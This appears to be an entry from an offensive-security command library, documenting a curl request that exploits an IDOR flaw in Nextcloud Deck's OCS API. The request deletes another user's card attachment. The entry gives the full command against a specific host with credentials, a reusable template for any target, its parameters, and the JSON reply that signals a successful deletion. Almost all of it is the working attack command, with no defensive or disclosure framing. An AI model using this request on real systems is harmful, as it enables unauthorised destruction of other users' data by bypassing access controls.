---
id: c3b2c3d4-e5f6-7890-abcd-ef1234567897
data: >-
  curl -X POST -u "UserB:password" -H "OCS-APIRequest: true"
  https://us.cloudamo.com/ocs/v2.php/apps/deck/api/v1.0/cards/8420/attachments/30
  -d "format=json"
tags:
  - delete
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:29:28.626Z'
verified: false
validated: true
submitted: true
---
# curl-delete-attachment

## Command

```bash
curl -X POST -u "UserB:password" -H "OCS-APIRequest: true" https://us.cloudamo.com/ocs/v2.php/apps/deck/api/v1.0/cards/8420/attachments/30 -d "format=json"
```

## Description

Sends a POST request to delete an attachment via Nextcloud's OCS API, bypassing controls due to IDOR.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for delete action | Yes |
| `-u` | Auth credentials | Yes |
| `-H` | API header | Yes |
| `-d` | JSON format param | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -u "user:pass" -H "OCS-APIRequest: true" https://target/ocs/v2.php/apps/deck/api/v1.0/cards/123/attachments/45 -d "format=json"
```

### Advanced Usage

Include additional headers for session cookies if needed.

## Expected Output

JSON response with {"ocs":{"meta":{"status":"ok"}}} indicating successful deletion.

## Related

- [[procedures/Delete-Unauthorized-Attachments-via-IDOR]]
